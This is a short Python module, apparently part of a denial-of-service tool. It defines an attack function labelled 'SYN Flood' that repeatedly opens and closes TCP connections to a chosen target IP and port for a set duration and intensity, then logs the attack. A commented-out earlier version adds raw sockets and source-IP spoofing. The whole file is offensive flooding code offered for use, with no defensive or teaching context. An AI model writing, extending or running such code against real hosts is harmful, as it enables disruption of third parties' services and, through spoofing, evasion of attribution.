# import socket
# import time
# from app.logger import log_attack

# def attack(target_ip, target_port, duration, intensity, packet_size=None, headers=None, spoof_ip=None):
#     start_time = time.time()
#     while time.time() - start_time < duration:
#         for _ in range(intensity):
#             sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
#             if spoof_ip:
#                 sock.bind((spoof_ip, 0))  # Bind to the spoofed IP
#             sock.connect_ex((target_ip, target_port))
#             sock.close()

#     log_attack("SYN Flood", target_ip, target_port, duration, intensity)


import socket
import time
from app.logger import log_attack

def attack(target_ip, target_port, duration, intensity, packet_size=None, headers=None, spoof_ip=None):
    start_time = time.time()
    while time.time() - start_time < duration:
        for _ in range(intensity):
            # Create a regular TCP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Spoof the source IP if provided (not supported with regular sockets)
            if spoof_ip:
                print("Warning: Source IP spoofing is not supported with regular TCP sockets.")
            # Connect to the target (SYN packet is sent automatically)
            sock.connect_ex((target_ip, target_port))
            sock.close()
    # Log the attack
    log_attack("SYN Flood", target_ip, target_port, duration, intensity)
    